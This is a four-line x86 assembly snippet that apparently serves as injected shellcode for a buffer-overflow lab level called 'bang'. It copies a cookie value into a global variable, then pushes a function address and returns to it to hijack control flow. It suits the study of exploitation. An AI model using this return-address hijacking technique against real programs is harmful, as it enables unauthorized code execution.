mov  0x804d108, %eax
mov  %eax, 0x804d100    # move cookie to global
push $0x08048c9d         # push bang into ret
ret                     # return
